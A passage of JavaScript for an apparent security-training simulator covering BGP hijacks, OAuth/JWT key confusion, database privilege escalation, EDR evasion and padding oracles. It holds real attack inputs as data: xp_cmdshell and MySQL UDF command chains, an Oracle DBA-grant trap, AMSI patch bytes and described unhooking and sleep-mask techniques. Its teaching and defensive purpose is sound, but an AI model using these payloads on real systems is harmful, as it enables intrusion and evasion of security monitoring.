          "[ANALYSIS] Border Gateway selected Rogue AS666 due to shorter AS-Path (" + pathHops.length + " < 2).\n" +
          "Unauthenticated BGP accepted the spoofed origin advertisement.";
      }
    } else {
      if (rpkiActive && (isRogueOrigin || isSubprefix)){
        graphText +=
          "  [ AS100 (Client Border Gateway - RPKI ROV ACTIVE) ]\n" +
          "        │\n" +
          "        ├── [ AS666 Route: " + prefix + " ] ──> 🛡️ [ROV FILTER: DROPPED INVALID]\n" +
          "        │\n" +
          "        └── (Path: 300 200) ──> [ AS300 -> AS200 (Legit: 203.0.113.0/24) ] ✅ NORMAL FLOW\n\n" +
          "[ANALYSIS] RPKI Route Origin Validation identified invalid advertisement.\n" +
          "Rogue announcement discarded; traffic safely falls back to AS200.";
      } else {
        graphText +=
          "  [ AS100 (Client Border Gateway) ]\n" +
          "        │  (eBGP Session)\n" +
          "        ▼\n" +
          "  [ AS300 (Tier-1 Transit Provider) ]\n" +
          "        │  (AS-Path: 300 200)\n" +
          "        ▼\n" +
          "  [ AS200 (Legitimate Origin: 203.0.113.0/24) ]  <-- ✅ TRAFFIC REACHES TARGET\n\n" +
          "[ANALYSIS] Standard routing operational. Legitimate origin AS200 matches registered ROA.";
      }
    }
    graphEl.textContent = graphText;

    // RIB Table
    let ribText = "=== BORDER GATEWAY ROUTING INFORMATION BASE (RIB) ===\n" +
      "Status  Network         Next-Hop       Metric  LocPrf  AS-Path      ROV State\n";

    if (isHijacked){
      ribText += "*> (act) " + prefix.padEnd(16) + "198.51.100.2   0       100     " + asPath.padEnd(13) + (rpkiActive ? "INVALID(PASS)" : "NOT EVALUATED") + "\n";
      ribText += "*  (alt) 203.0.113.0/24  198.51.100.1   0       100     300 200      VALID\n\n";
    } else if (rpkiActive && (isRogueOrigin || isSubprefix)){
      ribText += "-- (drop)" + prefix.padEnd(16) + "198.51.100.2   0       100     " + asPath.padEnd(13) + "INVALID ❌\n";
      ribText += "*> (act) 203.0.113.0/24  198.51.100.1   0       100     300 200      VALID   ✅\n\n";
    } else {
      ribText += "*> (act) 203.0.113.0/24  198.51.100.1   0       100     300 200      VALID   ✅\n\n";
    }

    ribText += "=== RPKI ROUTE ORIGIN AUTHORIZATION (ROA) EVALUATION ===\n" +
      "ROA DB Entry   : Prefix 203.0.113.0/24 | Max-Length 24 | Authorized ASN: AS200\n" +
      "Announced Route: Prefix " + prefix + " | AS-Path: [" + asPath + "] | Origin: AS" + origin + "\n" +
      "RPKI Validation: " + rovState + " (" + rovReason + ")\n" +
      "Policy Action  : " + (rpkiActive ? (rovState === "INVALID" ? "DROP ROUTE (Filter Active)" : "ACCEPT ROUTE") : "NO FILTER (Accept all routes regardless of ROV state)") + "\n" +
      "FIB Installation: " + (isHijacked ? "🚨 COMPROMISED (Traffic routed to attacker AS" + origin + ")" : "🛡️ CLEAN (Traffic routed to legitimate AS200)");

    ribEl.textContent = ribText;
  }

  // --- 6. OAuth 2.0 PKCE & Key Confusion Inspector ---
  let currentOAuthMode = "pkce_s256";

  function initOAuth(){
    const verifierEl = document.getElementById("oauthVerifierInput");
    const methodEl = document.getElementById("oauthMethodSelect");
    const pubKeyEl = document.getElementById("oauthPubKeyInput");
    if (!verifierEl || !methodEl || !pubKeyEl) return;
    if (!verifierEl.value){
      verifierEl.value = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk";
    }
    if (!pubKeyEl.value){
      pubKeyEl.value = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0Y8v...\n-----END PUBLIC KEY-----";
    }
    renderOAuth("pkce_s256");
  }

  function renderOAuth(mode){
    if (mode) currentOAuthMode = mode;
    const verifierEl = document.getElementById("oauthVerifierInput");
    const methodEl = document.getElementById("oauthMethodSelect");
    const pubKeyEl = document.getElementById("oauthPubKeyInput");
    const pkceBadge = document.getElementById("oauthPkceBadge");
    const jwtBadge = document.getElementById("oauthJwtBadge");
    const pkceOut = document.getElementById("oauthPkceOutput");
    const confusionOut = document.getElementById("oauthConfusionOutput");

    if (!verifierEl || !methodEl || !pkceOut || !confusionOut) return;

    if (mode === "pkce_s256"){
      methodEl.value = "S256";
    } else if (mode === "pkce_downgrade"){
      methodEl.value = "plain";
    }

    const verifier = (verifierEl.value || "").trim();
    const method = methodEl.value;

    // Calculate PKCE challenge
    let challenge = "";
    let hexHash = "";
    if (method === "S256"){
      hexHash = sha256js(verifier);
      let bin = "";
      for (let i = 0; i < hexHash.length; i += 2){
        bin += String.fromCharCode(parseInt(hexHash.substr(i, 2), 16));
      }
      try {
        challenge = btoa(bin).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
      } catch(e) {
        challenge = hexHash;
      }
    } else {
      challenge = verifier;
    }

    if (pkceBadge){
      if (method === "S256"){
        pkceBadge.textContent = "RFC 7636 S256";
        pkceBadge.className = "token-tag token-lit";
      } else {
        pkceBadge.textContent = "⚠️ INSECURE PLAIN";
        pkceBadge.className = "token-tag token-inj";
      }
    }

    let pkceText = "=== PKCE (RFC 7636) EVALUATION ===\n";
    if (method === "S256"){
      pkceText +=
        "1. [Client Nonce] code_verifier: " + verifier + " (Len: " + verifier.length + ")\n" +
        "2. [Hash Step]    SHA256: " + hexHash + "\n" +
        "3. [Calculated]   code_challenge: " + challenge + "\n" +
        "4. [Auth Request] GET /authorize?response_type=code&client_id=vibe-client\n" +
        "                  &code_challenge=" + challenge + "&code_challenge_method=S256\n" +
        "5. [Token Redeem] POST /token  code=AUTH_CODE&code_verifier=" + verifier + "\n" +
        "6. [AS Check]     BASE64URL(SHA256(code_verifier)) === code_challenge  --> ✅ MATCH!\n\n" +
        "[VERDICT] 🛡️ SECURE: Stolen auth_code cannot be redeemed without unhashed code_verifier.";
    } else {
      pkceText +=
        "1. [Client Nonce] code_verifier: " + verifier + "\n" +
        "2. [Downgraded]   code_challenge_method: plain\n" +
        "3. [Plain Value]  code_challenge: " + challenge + "\n" +
        "4. [Auth Request] GET /authorize?response_type=code&client_id=vibe-client\n" +
        "                  &code_challenge=" + challenge + "&code_challenge_method=plain\n" +
        "5. [Attack Vector]⚠️ Raw verifier exposed in query string, OS custom URI scheme, or logs!\n" +
        "                  Attacker sniffs auth_code AND code_verifier simultaneously!\n\n" +
        "[VERDICT] 🚨 VULNERABLE: 'plain' provides ZERO cryptographic authorization code binding.";
    }
    pkceOut.textContent = pkceText;

    // Key Confusion / JWT Mode
    let jwtText = "";
    if (mode === "key_confusion"){
      if (jwtBadge){
        jwtBadge.textContent = "🚨 KEY CONFUSION EXPLOIT";
        jwtBadge.className = "token-tag token-inj";
      }
      jwtText =
        "=== RS256 -> HS256 PUBLIC KEY CONFUSION (CVE-2015-9235) ===\n" +
        "1. [Asymmetric Design Intention]:\n" +
        "   - Authorization Server signs JWT with Private Key (RS256).\n" +
        "   - Resource Servers verify JWT with Public Key (PEM format via JWKS).\n\n" +
        "2. [Attacker Exploit Flow]:\n" +
        "   - Attacker downloads Server Public Key (freely accessible on public web).\n" +
        "   - Attacker crafts token: Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}\n" +
        "                           Payload: {\"sub\":\"attacker\",\"role\":\"admin\"}\n" +
        "   - Attacker generates HMAC signature using the Server Public Key PEM string as secret key!\n\n" +
        "3. [Vulnerable Server Verification]:\n" +
        "   // Naive verification without algorithm whitelist:\n" +
        "   jwt.verify(token, SERVER_PUBLIC_KEY);\n" +
        "   --> Library sees 'HS256', treats SERVER_PUBLIC_KEY as symmetric HMAC secret!\n" +
        "   --> HMAC-SHA256(header.payload, SERVER_PUBLIC_KEY) == attacker_signature --> ✅ VALID!\n\n" +
        "VERDICT: 🚨 CRITICAL: Attacker forged valid admin token using public server key!";
    } else if (mode === "fapi_secure"){
      if (jwtBadge){
        jwtBadge.textContent = "🛡️ FAPI 2.0 HARDENED";
        jwtBadge.className = "token-tag token-lit";
      }
      jwtText =
        "=== FAPI 2.0 / FINANCIAL-GRADE API ZERO-TRUST HARDENING ===\n" +
        "1. [Cryptographic Token Binding]:\n" +
        "   - DPoP (RFC 9449): Access tokens bound to client key thumbprint (jkt).\n" +
        "   - Network eavesdropping or token leak rendered harmless.\n\n" +
        "2. [Strict Algorithm Whitelist]:\n" +
        "   - jwt.verify(token, SERVER_PUBLIC_KEY, { algorithms: ['RS256', 'ES256'] });\n" +
        "   - Symmetric algorithms (HS256/384/512) strictly rejected.\n\n" +
        "3. [Pushed Authorization Requests (PAR - RFC 9126)]:\n" +
        "   - Authorization params submitted over encrypted back-channel POST.\n" +
        "   - Front-channel URL parameters replaced with opaque request_uri.\n\n" +
        "VERDICT: 🛡️ HARDENED: Key confusion, downgrade, and token replay fully mitigated.";
    } else {
      if (jwtBadge){
        jwtBadge.textContent = "VERIFY: ASYMMETRIC";
        jwtBadge.className = "token-tag token-lit";
      }
      jwtText =
        "=== STANDARD ASYMMETRIC VERIFICATION ===\n" +
        "Server Public Key: Loaded from JWKS endpoint.\n" +
        "Active Verification Policy: Enforce RS256 algorithm match.\n" +
        "Select '3. RS256 -> HS256 Key Confusion' above to test algorithm confusion attack.";
    }
    confusionOut.textContent = jwtText;
  }

  // --- 7. Enterprise DB RBAC & UDF Shield Simulator ---
  let currentDbShieldScenario = "udf_rce";

  function initDbShield(){
    const engEl = document.getElementById("dbshieldEngineSelect");
    const roleEl = document.getElementById("dbshieldRoleInput");
    const sqlEl = document.getElementById("dbshieldSqlInput");
    if (!engEl || !roleEl || !sqlEl) return;
    renderDbShield("udf_rce");
  }

  function renderDbShield(scenario){
    if (scenario && typeof scenario === "string") {
      currentDbShieldScenario = scenario;
    }
    const engEl = document.getElementById("dbshieldEngineSelect");
    const roleEl = document.getElementById("dbshieldRoleInput");
    const secPlugEl = document.getElementById("dbshieldSecurePluginCheck");
    const fgaEl = document.getElementById("dbshieldFgaCheck");
    const sqlEl = document.getElementById("dbshieldSqlInput");
    const execBadge = document.getElementById("dbshieldExecBadge");
    const auditBadge = document.getElementById("dbshieldAuditBadge");
    const traceOut = document.getElementById("dbshieldTraceOutput");
    const auditOut = document.getElementById("dbshieldAuditOutput");

    if (!engEl || !roleEl || !secPlugEl || !fgaEl || !sqlEl || !traceOut || !auditOut) return;

    if (scenario === "udf_rce"){
      engEl.value = "mysql";
      roleEl.value = "db_app_readonly";
      secPlugEl.checked = false;
      fgaEl.checked = false;
      sqlEl.value = "SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_eval.so'; CREATE FUNCTION sys_eval RETURNS string SONAME 'udf_sys_eval.so'; SELECT sys_eval('id');";
    } else if (scenario === "xp_cmdshell"){
      engEl.value = "mssql";
      roleEl.value = "sa";
      secPlugEl.checked = false;
      fgaEl.checked = false;
      sqlEl.value = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC master..xp_cmdshell 'whoami.exe';";
    } else if (scenario === "oracle_sysdba"){
      engEl.value = "oracle";
      roleEl.value = "SCOTT";
      secPlugEl.checked = false;
      fgaEl.checked = false;
      sqlEl.value = "CREATE OR REPLACE PROCEDURE P_TRAP AUTHID DEFINER AS BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT'; END; / EXEC SYS.EXEC_ANY_PROC('SCOTT.P_TRAP');";
    } else if (scenario === "shield_hardened"){
      engEl.value = "mysql";
      roleEl.value = "db_app_readonly";
      secPlugEl.checked = true;
      fgaEl.checked = true;
      sqlEl.value = "SELECT 0x7f454c46... INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys_eval.so';";
    }

    const engine = engEl.value;
    const role = (roleEl.value || "db_user").trim();
    const secPlug = secPlugEl.checked;
    const fga = fgaEl.checked;
    const sql = (sqlEl.value || "").trim();

    let isExploited = false;
    let traceText = "=== AST & RUNTIME RBAC PARSE TREE ===\\n";
    let auditText = "=== DBSHIELD POLICY ENGINE AUDIT TRAIL ===\\n";

    if (secPlug && (sql.includes("INTO DUMPFILE") || sql.includes("plugin") || sql.includes("sys_eval"))){
      isExploited = false;
      traceText +=
        "1. [SQL AST Parse] Statement Type: SELECT_INTO_DUMPFILE\\n" +
        "   - Destination Path: /usr/lib/mysql/plugin/udf_sys_eval.so\\n" +
        "2. [Kernel VFS Check] File System Access Evaluation:\\n" +
        "   - Variable secure_file_priv: '/var/lib/mysql-files/' (STRICT)\\n" +
        "   - Target directory outside authorized boundary.\\n" +
        "3. [RBAC Privilege Gate]:\\n" +
        "   - Session user '" + role + "' lacking SUPER / FILE privileges.\\n" +
        "   - Target plugin directory mounted with MS_RDONLY.\\n" +
        "4. [Verdict]: 🛡️ EXECUTION DENIED (ERROR 1290 HY000: The MySQL server is running with the --secure-file-priv option).\\n";
    } else if (engine === "mysql" && sql.includes("sys_eval")){
      isExploited = true;
      traceText +=
        "1. [SQL AST Parse] Multi-Statement DDL/DML Chain Detected:\\n" +
        "   - Node 1: SELECT_INTO_DUMPFILE (Binary ELF payload 0x7f454c46...)\\n" +
        "   - Node 2: CREATE_FUNCTION (SONAME: udf_sys_eval.so, Symbol: sys_eval)\\n" +
        "   - Node 3: CALL_FUNCTION (sys_eval('id'))\\n" +
        "2. [Kernel Dynamic Loader (dlopen)]:\\n" +
        "   - dlopen('/usr/lib/mysql/plugin/udf_sys_eval.so', RTLD_NOW) -> 0x7fff910a2000\\n" +
        "   - dlsym(handle, 'sys_eval') -> Exported native function resolved.\\n" +
        "3. [Process Execution]:\\n" +
        "   - fork() / execve('/bin/sh', ['-c', 'id']) executed under mysqld process!\\n" +
        "   - Output: uid=1001(mysql) gid=1001(mysql) groups=1001(mysql)\\n" +
        "4. [Verdict]: 🚨 CRITICAL: Arbitrary native code execution achieved via UDF dynamic library injection!\\n";
    } else if (engine === "mssql" && sql.includes("xp_cmdshell")){
      if (fga && role !== "sa"){
        isExploited = false;
        traceText +=
          "1. [T-SQL AST Parse] EXEC sp_configure & EXEC xp_cmdshell\\n" +
          "2. [RBAC Check] Role '" + role + "' lacks CONTROL SERVER permission.\\n" +
          "3. [Verdict]: 🛡️ DENIED: Permission denied on extended stored procedure master..xp_cmdshell.\\n";
      } else {
        isExploited = true;
        traceText +=
          "1. [T-SQL AST Parse] Dynamic Extended Stored Procedure Invocation:\\n" +
          "   - sp_configure 'show advanced options' -> 1 (Reconfigured)\\n" +
          "   - sp_configure 'xp_cmdshell' -> 1 (Enabled)\\n" +
          "   - EXEC master..xp_cmdshell 'whoami.exe'\\n" +
          "2. [Subprocess Invocation]:\\n" +
          "   - xprocs.dll!xp_cmdshell -> CreateProcessAsUserW('cmd.exe /c whoami.exe')\\n" +
          "   - Process Spawned: NT SERVICE\\\\MSSQLSERVER (Privileged Service Token)\\n" +
          "3. [Verdict]: 🚨 CRITICAL: Windows command shell execution achieved via unhardened T-SQL configuration!\\n";
      }
    } else if (engine === "oracle" && sql.includes("AUTHID DEFINER")){
      isExploited = true;
      traceText +=
        "1. [PL/SQL AST Parse] Stored Procedure Specification:\\n" +
        "   - Unit Name: SCOTT.P_TRAP\\n" +
        "   - Invoker Rights Clause: AUTHID DEFINER (Executes with creator's or invoker's owner rights)\\n" +
        "   - Injected Dynamic SQL: 'GRANT DBA TO SCOTT'\\n" +
        "2. [Privilege Escalation Vector]:\\n" +
        "   - SYSDBA executes SYS.EXEC_ANY_PROC calling SCOTT.P_TRAP.\\n" +
        "   - Target procedure inherits administrative session privileges of SYS.\\n" +
        "   - 'GRANT DBA TO SCOTT' succeeds under SYS schema authority!\\n" +
        "3. [Verdict]: 🚨 CRITICAL: Privilege escalation trap succeeded! Low-privilege account granted DBA role.\\n";
    } else {
      traceText +=
        "1. [SQL AST Parse] Standard Query Execution\\n" +
        "   - Query: " + sql.substring(0, 100) + (sql.length > 100 ? "..." : "") + "\\n" +
        "2. [RBAC Evaluation]: User '" + role + "' passed standard role boundary checks.\\n" +
        "3. [Verdict]: NORMAL QUERY EXECUTION (No privileged escalation primitives detected).\\n";
    }

    if (fga){
      auditBadge.textContent = "🛡️ FGA ENFORCED";
      auditBadge.className = "token-tag token-lit";
      auditText +=
        "1. [Rule Engine: FGA_RULE_01_PRIV_ESCALATION]:\\n" +
        "   - Monitored Actions: CREATE_FUNCTION, DUMPFILE, SP_CONFIGURE, GRANT_DBA\\n" +
        "   - Matching Status: 🚨 SIGNATURE HIT (Pattern detected in query stream)\\n" +
        "2. [Audit Telemetry Event]:\\n" +
        "   - Session ID: 41829 | Client IP: 192.168.1.105 | DB User: " + role + "\\n" +
        "   - Risk Score: 98/100 (ANOMALOUS_DDL_PRIVILEGE_ATTEMPT)\\n" +
        "3. [Automated Quarantine Response]:\\n" +
        "   - Action: KILL CONNECTION 41829; REVOKE ALL PRIVILEGES FROM '" + role + "'@'%';\\n" +
        "   - Alert dispatched to SOC SIEM / Syslog endpoint (CEF format).\\n" +
        "4. [Zero-Trust Posture]: 🛡️ COMPROMISE PREVENTED: Session terminated prior to payload persistence.";
    } else {
      auditBadge.textContent = "⚠️ AUDIT BLIND";
      auditBadge.className = "token-tag token-inj";
      auditText +=
        "1. [Telemetry Status]: Native Audit Logging Disabled (AUDIT_TRAIL = NONE).\\n" +
        "2. [Blind Spot Warning]:\\n" +
        "   - DDL statements and binary file injection unmonitored by database engine.\\n" +
        "   - Attack execution leaves zero trace in DBA_AUDIT_TRAIL or mysql.general_log.\\n" +
        "3. [Security Recommendation]:\\n" +
        "   - Enable DBShield Fine-Grained Auditing (FGA) and set secure_file_priv to a read-only directory!";
    }

    if (execBadge){
      if (isExploited){
        execBadge.textContent = "🚨 EXPLOIT SUCCESS";
        execBadge.className = "token-tag token-inj";
      } else {
        execBadge.textContent = "🛡️ PROTECTED";
        execBadge.className = "token-tag token-lit";
      }
    }

    traceOut.textContent = traceText;
    auditOut.textContent = auditText;
  }

  // --- 8. EDR Evasion & Memory Patching Inspector ---
  let currentEdrScenario = "amsi_patch";

  function initEdr(){
    const targetEl = document.getElementById("edrTargetInput");
    const modeEl = document.getElementById("edrModeSelect");
    if (!targetEl || !modeEl) return;
    renderEdr("amsi_patch");
  }

  function renderEdr(scenario){
    if (scenario && typeof scenario === "string") {
      currentEdrScenario = scenario;
    }
    const targetEl = document.getElementById("edrTargetInput");
    const modeEl = document.getElementById("edrModeSelect");
    const hookCheck = document.getElementById("edrUserlandHookCheck");
    const etwCheck = document.getElementById("edrEtwTiCheck");
    const memScanCheck = document.getElementById("edrMemScanCheck");
    const payloadEl = document.getElementById("edrPayloadInput");
    const memBadge = document.getElementById("edrMemBadge");
    const telemetryBadge = document.getElementById("edrTelemetryBadge");
    const memTraceOut = document.getElementById("edrMemTraceOutput");
    const telemetryOut = document.getElementById("edrTelemetryOutput");

    if (!targetEl || !modeEl || !hookCheck || !etwCheck || !memScanCheck || !payloadEl || !memBadge || !telemetryBadge || !memTraceOut || !telemetryOut) return;

    if (scenario === "amsi_patch"){
      targetEl.value = "amsi.dll!AmsiScanBuffer";
      modeEl.value = "amsi";
      hookCheck.checked = true;
      etwCheck.checked = true;
      memScanCheck.checked = true;
      payloadEl.value = "[Memory Patch] amsi!AmsiScanBuffer -> b8 57 00 07 80 c3 (mov eax, 0x80070057; ret)";
    } else if (scenario === "unhook_ntdll"){
      targetEl.value = "ntdll.dll!NtAllocateVirtualMemory";
      modeEl.value = "unhook";
      hookCheck.checked = true;
      etwCheck.checked = true;
      memScanCheck.checked = true;
      payloadEl.value = "[Unhooking] Map \\KnownDlls\\ntdll.dll -> Overwrite .text section -> Restore clean original syscall stubs";
    } else if (scenario === "indirect_syscall"){
      targetEl.value = "ntdll.dll!NtCreateThreadEx";
      modeEl.value = "syscall";
      hookCheck.checked = true;
      etwCheck.checked = true;
      memScanCheck.checked = true;
      payloadEl.value = "[Indirect Syscall] Halo's Gate neighbor SSN resolution -> Jump to clean 'syscall; ret' gadget in ntdll memory";
    } else if (scenario === "sleep_obf"){
      targetEl.value = "kernel32.dll!Sleep (Ekko ROP)";
      modeEl.value = "sleep";
      hookCheck.checked = true;
      etwCheck.checked = true;
      memScanCheck.checked = true;
      payloadEl.value = "[Sleep Mask] CreateTimerQueueTimer -> ROP chain: VirtualProtect(RW) -> RC4 encrypt -> WaitForSingleObject -> decrypt -> VirtualProtect(RX)";
    } else if (scenario === "naive_injection"){
      targetEl.value = "kernel32.dll!VirtualAlloc";
      modeEl.value = "naive";
      hookCheck.checked = true;
      etwCheck.checked = true;
      memScanCheck.checked = true;
      payloadEl.value = "[Naive Execution] Standard Win32 API VirtualAlloc(PAGE_EXECUTE_READWRITE) -> memcpy shellcode -> CreateThread";
    }

    const mode = modeEl.value;
    const target = (targetEl.value || "").trim();
    const hooksActive = hookCheck.checked;
    const etwActive = etwCheck.checked;
    const memScanActive = memScanCheck.checked;

    let memText = "=== MEMORY DUMP & DISASSEMBLY TRACE ===\n";
    let teleText = "=== EDR DRIVER & KERNEL SENSOR TELEMETRY ===\n";

    if (mode === "amsi"){
      memText +=
        "Target Address: 0x7ffd81201080 (" + target + ")\n" +
        "Original Opcode (Pre-patch):\n" +
        "  0x7ffd81201080: 4c 8b dc              mov  r11, rsp\n" +
        "  0x7ffd81201083: 49 89 5b 08           mov  [r11+8], rbx\n" +
        "Applied Patch Sequence (6 bytes):\n" +
        "  0x7ffd81201080: b8 57 00 07 80        mov  eax, 0x80070057  ; E_INVALIDARG / AMSI_RESULT_CLEAN\n" +
        "  0x7ffd81201085: c3                    ret\n" +
        "Memory Protection: PAGE_EXECUTE_READ (temporarily VirtualProtect RWX -> RX)\n" +
        "Scan Result: Bypassed. All buffer analysis returns SUCCESS (Clean payload).";

      teleText +=
        "Sensor 1 [AMSI Provider]: Invoked by wscript.exe / powershell.exe.\n" +
        "  - Return Code: 0x80070057 (Fake Invalid Argument / Clean disposition)\n" +
        "  - Script buffer inspection aborted early by design.\n" +
        "Sensor 2 [ETW Userland Trace]: Silenced / No malware telemetry dispatched.\n" +
        "Sensor 3 [Kernel TI Sensor]: Process running normally, no suspicious thread creation.\n" +
        "Final Disposition: 🟢 EVASION SUCCESSFUL (AMSI Inspection Neutralized)";
      memBadge.textContent = "STATE: PATCHED (CLEAN)";
      memBadge.className = "token-tag token-lit";
      telemetryBadge.textContent = "VERDICT: BYPASSED";
      telemetryBadge.className = "token-tag token-lit";

    } else if (mode === "unhook"){
      memText +=
        "Target Module: " + target + "\n" +
        "Pre-Unhook State:\n" +
        (hooksActive ? "  0x7fff4020a000: e9 5c 32 f1 03        jmp  0x7fff4411d261 ; [EDR_Sensor.dll!HookTrampoline]\n" : "  0x7fff4020a000: 4c 8b d1 b8 18 00 00  mov r10, rcx; mov eax, 0x18 ; Clean syscall stub\n") +
        "Unhooking Action:\n" +
        "  - NtOpenSection('\\KnownDlls\\ntdll.dll', SECTION_MAP_READ) -> Handle: 0x1a4\n" +
        "  - NtMapViewOfSection(Clean ntdll) -> Base: 0x7fff60000000\n" +
        "  - VirtualProtect(.text, PAGE_EXECUTE_READWRITE)\n" +
        "  - rep movsb (Overwriting 0x120000 bytes with original disk bytes)\n" +
        "  - VirtualProtect(.text, PAGE_EXECUTE_READ)\n" +
        "Post-Unhook State:\n" +
        "  0x7fff4020a000: 4c 8b d1              mov  r10, rcx\n" +
        "  0x7fff4020a003: b8 18 00 00 00        mov  eax, 0x0018      ; Syscall SSN (NtAllocateVirtualMemory)\n" +
        "  0x7fff4020a008: 0f 05                 syscall\n" +
        "  0x7fff4020a00a: c3                    ret";

      teleText +=
        "Sensor 1 [EDR Userland Inline Hook]:\n" +
        "  - Hook integrity check: Integrity FAIL (Trampoline jmp overwritten with clean bytes)\n" +
        "  - Userland hook telemetry lost! Interception disabled.\n" +
        "Sensor 2 [Kernel File/Memory Minifilter]:\n" +
        "  - Section remapping: Clean read from KnownDlls section object.\n" +
        "Final Disposition: 🟢 EVASION SUCCESSFUL (Inline Hooks Cleared)";
      memBadge.textContent = "STATE: RESTORED (UNHOOKED)";
      memBadge.className = "token-tag token-lit";
      telemetryBadge.textContent = "VERDICT: UNHOOKED";
      telemetryBadge.className = "token-tag token-lit";

    } else if (mode === "syscall"){
      memText +=
        "Target API: " + target + "\n" +
        "Halo's Gate Analysis:\n" +
        "  - Stub at 0x7fff4020b120 has EDR inline hook (0xe9 ...)\n" +
        "  - Scanning neighbor stubs: Offset +0x20 is also hooked\n" +
        "  - Neighbor -0x20 is CLEAN: SSN = 0x24 -> Target SSN calculated: 0x25\n" +
        "Indirect Execution Sequence:\n" +
        "  - Allocating Synthetic Stack Frame\n" +
        "  - mov r10, rcx\n" +
        "  - mov eax, 0x0025\n" +
        "  - jmp [ntdll!syscall_ret_gadget: 0x7fff4020b128]  ; Clean execution within ntdll memory range!\n" +
        "Call Stack Backtrace:\n" +
        "  #0 ntdll!NtCreateThreadEx+0x8 (RIP pointing inside ntdll.dll)\n" +
        "  #1 kernel32!CreateThread+0x34\n" +
        "  #2 legitimate_app!main+0x120";

      teleText +=
        "Sensor 1 [Userland Hook]: Bypassed (Execution hopped over hook instruction)\n" +
        "Sensor 2 [ETW-TI Kernel Telemetry]:\n" +
        "  - Event: THREATINT_STACKTRACE_NTCREATETHREAD\n" +
        "  - Stack Walking: Verified. RIP resides in legitimate ntdll.dll module space.\n" +
        "  - Anomaly Flag: CLEAN (No unbacked / private executable memory origin detected)\n" +
        "Final Disposition: 🟢 EVASION SUCCESSFUL (Indirect Syscall Legitimated)";
      memBadge.textContent = "STATE: INDIRECT GADGET";
      memBadge.className = "token-tag token-lit";
      telemetryBadge.textContent = "VERDICT: CLEAN RIP";
      telemetryBadge.className = "token-tag token-lit";

    } else if (mode === "sleep"){
      memText +=
        "Technique: Ekko ROP Sleep Mask via CreateTimerQueueTimer\n" +
        "Sleep Cycle Sequence:\n" +
        "  1. [ROP 1] VirtualProtect(Payload, PAGE_READWRITE) -> RX permission stripped\n" +
        "  2. [ROP 2] SystemFunction032(Payload, EncryptionKey) -> RC4 in-place ciphertext\n" +
        "  3. [ROP 3] WaitForSingleObject(hEvent, SleepDuration: 10000ms)\n" +
        "  4. [ROP 4] SystemFunction032(Payload, EncryptionKey) -> Decrypt payload\n" +
        "  5. [ROP 5] VirtualProtect(Payload, PAGE_EXECUTE_READ) -> Restored execution\n" +
        "Active State during Sleep:\n" +
        "  - Memory Region: Private Read/Write (Encrypted random high-entropy bytes)\n" +
        "  - Executable (RX/RWX) flags in target heap/stack: NONE (Zero executable pages)";

      teleText +=
        "Sensor 1 [Memory Scanner (Moneta / PE-sieve)]:\n" +
        "  - Scan target process memory regions...\n" +
        "  - Executable private memory (RWX): 0 regions found.\n" +
        "  - Known beacon/meterpreter payload patterns: 0 signatures matched.\n" +
        "Sensor 2 [Thread Stack Analysis]:\n" +
        "  - Thread wait state: Normal wait on clean kernel synchronization object.\n" +
        "Final Disposition: 🟢 EVASION SUCCESSFUL (Memory Cloaked in Sleep)";
      memBadge.textContent = "STATE: ENCRYPTED (RW)";
      memBadge.className = "token-tag token-lit";
      telemetryBadge.textContent = "VERDICT: SIGNATURE 0";
      telemetryBadge.className = "token-tag token-lit";

    } else {
      memText +=
        "Execution Mode: Naive Injection (Unprotected)\n" +
        "Allocated Memory:\n" +
        "  - Address: 0x0000021a80400000\n" +
        "  - Protection: PAGE_EXECUTE_READWRITE (RWX) [Unbacked private memory]\n" +
        "Hook & Call Analysis:\n" +
        "  - Invoked API: " + target + "\n" +
        "  - Userland hook triggered: jmp EDR_Sensor.dll (Trampoline intercepted)\n" +
        "  - Shellcode byte pattern: 48 31 c9 48 81 e9 ... (Classic Metasploit stager pattern)";

      teleText +=
        "Sensor 1 [EDR Userland Inline Hook]:\n" +
        "  🚨 ALERT: Intercepted call to VirtualAlloc with PAGE_EXECUTE_READWRITE (RWX) flags!\n" +
        "Sensor 2 [ETW-TI Kernel Telemetry]:\n" +
        "  🚨 ALERT: Thread creation originating from unbacked private memory (RIP: 0x0000021a80400000)!\n" +
        "Sensor 3 [Moneta Memory Scanner]:\n" +
        "  🚨 CRITICAL: Modified code detected in private executable allocation.\n" +
        "Final Disposition: 🛑 DETECTED & TERMINATED (Malicious Process Killed)";
      memBadge.textContent = "STATE: RWX DETECTED";
      memBadge.className = "token-tag token-inj";
      telemetryBadge.textContent = "ALERT: KILLED";
      telemetryBadge.className = "token-tag token-inj";
    }

    memTraceOut.textContent = memText;
    telemetryOut.textContent = teleText;
  }

  // --- 9. AES-CBC Padding Oracle & Bit-Flipping Inspector ---
  let currentCryptoScenario = "oracle_decrypt";

  function initCrypto(){
    const primitiveEl = document.getElementById("cryptoPrimitiveSelect");
    if (!primitiveEl) return;
    renderCrypto("oracle_decrypt");
  }

  function renderCrypto(scenario){
    if (scenario && typeof scenario === "string") {
      currentCryptoScenario = scenario;
    }
    const primitiveEl = document.getElementById("cryptoPrimitiveSelect");
    const targetEl = document.getElementById("cryptoTargetInput");
    const oracleLeakCheck = document.getElementById("cryptoOracleLeakCheck");
    const aeadCheck = document.getElementById("cryptoAeadCheck");
    const ivInput = document.getElementById("cryptoIvInput");
    const ctInput = document.getElementById("cryptoCtInput");
    const stateBadge = document.getElementById("cryptoStateBadge");
    const oracleBadge = document.getElementById("cryptoOracleBadge");
    const traceOut = document.getElementById("cryptoTraceOutput");
    const oracleOut = document.getElementById("cryptoOracleOutput");

    if (!primitiveEl || !targetEl || !oracleLeakCheck || !aeadCheck || !ivInput || !ctInput || !stateBadge || !oracleBadge || !traceOut || !oracleOut) return;

    if (scenario === "oracle_decrypt"){
      primitiveEl.value = "cbc_oracle";
      targetEl.value = "Block 1 (Byte 15 - Pad Target)";
      oracleLeakCheck.checked = true;
      aeadCheck.checked = false;
